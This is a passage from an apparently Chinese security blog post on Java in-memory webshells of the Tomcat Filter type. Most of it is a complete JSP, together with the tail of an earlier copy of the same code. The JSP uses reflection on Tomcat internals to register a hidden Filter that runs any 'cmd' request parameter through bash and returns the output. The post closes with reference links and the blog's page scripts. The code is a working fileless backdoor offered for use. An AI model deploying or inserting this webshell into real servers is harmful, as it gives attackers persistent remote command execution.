class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.addURLPattern(urlPattern);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>        filterConfigs.put(name,filterConfig);<br>    &#125;<br>&#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>    e.printStackTrace();<br>&#125;<br>out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>文件上传jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lousix&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">urlPattern</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/lousix&quot;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-comment">// ServletContext servletContext = request.getSession().getServletContext();</span><br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.addURLPattern(urlPattern);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>        filterConfigs.put(name,filterConfig);<br>    &#125;<br>&#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>    e.printStackTrace();<br>&#125;<br>out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;filter&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    Hello Filter<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whgk/p/6399262.html">https://www.cnblogs.com/whgk/p/6399262.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1894003">https://cloud.tencent.com/developer/article/1894003</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java 内存马(一)——Filter</div>
+      <div>http://blog.lousix.top/2023/03/31/Java 内存马(一)——Filter/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lousix</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95(%E4%BA%8C)/" title="Java反序列化恶意代码执行方法(二）">
+                        <span class="hidden-mobile">Java反序列化恶意代码执行方法(二）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a>Author: Lousix<a><br> <a>Email: 2601335041@qq.com<a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP证2023001487号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
